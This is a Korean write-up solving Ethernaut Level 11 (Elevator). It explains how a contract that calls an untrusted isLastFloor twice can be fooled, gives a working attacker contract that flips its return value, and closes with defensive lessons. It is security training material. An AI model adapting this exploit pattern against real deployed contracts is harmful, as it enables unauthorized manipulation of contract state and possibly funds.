# Ethernaut Level 11 - Elevator

## 문제 설명

`Elevator` 컨트랙트에서 `top` 변수를 `true`로 만드는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

---

## 취약점 분석

### 1. 외부 컨트랙트 신뢰

`isLastFloor()`를 **같은 호출에서 두 번** 호출한다.

- 첫 번째 호출: `false` 반환 → if 블록 진입
- 두 번째 호출: `true` 반환 → `top = true`

→ 호출 횟수에 따라 다른 값을 반환하는 악의적 컨트랙트로 조작 가능

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorAttack {
    bool public toggle = true;

    function isLastFloor(uint) external returns (bool) {
        toggle = !toggle;
        return toggle;
        // 첫 번째 호출: true → false 반환 (if 조건 통과)
        // 두 번째 호출: false → true 반환 (top = true)
    }

    function attack(address _elevator) public {
        IElevator(_elevator).goTo(1);
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포 후 attack 실행

```
_elevator : Elevator 인스턴스 주소
```

transact 클릭 후 MetaMask 승인

### Step 2 — 확인

```js
await contract.top()
// → true
```

---

## 핵심 교훈

- 외부 컨트랙트가 반환하는 값을 신뢰하지 말 것
- 같은 함수를 여러 번 호출할 때 일관된 결과를 보장받을 수 없음
- 인터페이스 함수를 `view`로 선언하면 상태 변경을 막을 수 있음
